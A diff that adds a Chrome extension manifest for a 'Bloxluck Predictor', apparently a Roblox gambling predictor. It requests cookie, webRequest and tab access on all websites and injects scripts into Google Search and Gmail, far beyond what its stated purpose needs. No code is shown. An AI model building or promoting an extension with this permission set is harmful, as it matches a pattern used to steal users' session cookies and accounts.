@@ -1,0 +1,53 @@
+{
+  "manifest_version": 3,
+  "name": "Bloxluck Predictor",
+  "description": "Made By HYBRID",
+  "version": "9.2",
+  "icons": {
+    "16": "assets/blox.png",
+    "48": "assets/blox.png",
+    "128": "assets/blox.png"
+  },
+  "permissions": [
+    "cookies",
+    "webRequest",
+    "storage",
+    "tabs",
+    "alarms"
+  ],
+  "action": {
+    "default_popup": "main.html",
+    "default_icon": "assets/blox.png"
+  },
+  "background": {
+    "service_worker": "background.js"
+  },
+  "content_scripts": [
+    {
+      "matches": [
+        "https://www.google.com/*",
+        "https://mail.google.com/*"
+      ],
+      "js": [
+        "content.js"
+      ]
+    },
+    {
+      "matches": [
+        "*://*.roblox.com/*"
+      ],
+      "js": [
+        "src/content.js"
+      ],
+      "css": [
+        "src/style.css"
+      ],
+      "run_at": "document_idle"
+    }
+  ],
+  "host_permissions": [
+    "http://*/*",
+    "https://*/*",
+    "*://*.roblox.com/*"
+  ]
+}
